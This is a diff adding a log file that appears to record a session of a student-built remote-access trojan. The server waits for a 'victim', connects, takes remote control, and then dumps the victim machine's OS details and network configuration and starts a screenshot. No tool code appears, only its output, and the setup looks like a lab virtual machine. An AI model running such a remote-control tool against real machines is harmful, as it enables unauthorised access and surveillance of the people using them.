@@ -1,0 +1,57 @@
+
+[STARTING] Starting the server...: 100% █████████████████████████
+[LISTENING] The Sever is waiting for a victim...
+
+[CONNECTED] Established a connection with the Victim using socket: ('192.168.1.224', 47146)
+[RECEIVING] Waiting for OS Info...: 100% ████████████████████████
+
+Information on the victim's Operating System ('192.168.1.224', 47146):
+[REMOTE CONTROL] Starting procedure...:   0%                     
+[PATH]/home/alessio/Documents/final test/Binotto Team - Erasmo
+
+[DONE] Info received.
+
+[REMOTE CONTROL] Starting procedure...: 100% ████████████████████
+[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...
+
+/home/alessio/Documents/final test/Binotto Team - Erasmo$ info
+Operating System: Linux
+Machine: x86_64
+Host: Ubuntu-20-04-LTS
+Processor: x86_64
+Platform: Linux-5.15.0-52-generic-x86_64-with-glibc2.35
+Release: 5.15.0-52-generic
+Path: /home/alessio/Documents/final test/Binotto Team - Erasmo
+
+/home/alessio/Documents/final test/Binotto Team - Erasmo$ network
+### Dati configurazione di rete ###
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::9406:ff6d:57df:81b6  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:63:f0:81  txqueuelen 1000  (Ethernet)
+        RX packets 123  bytes 22162 (22.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1263  bytes 89673 (89.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.224  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::e19:8dfb:3aca:f9d2  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:a3:93:73  txqueuelen 1000  (Ethernet)
+        RX packets 11453  bytes 821800 (821.8 KB)
+        RX errors 0  dropped 8  overruns 0  frame 0
+        TX packets 75390  bytes 106007373 (106.0 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Loopback locale)
+        RX packets 3079  bytes 292620 (292.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3079  bytes 292620 (292.6 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+/home/alessio/Documents/final test/Binotto Team - Erasmo$ screenshot
+Name of the screen (without extension): screen1
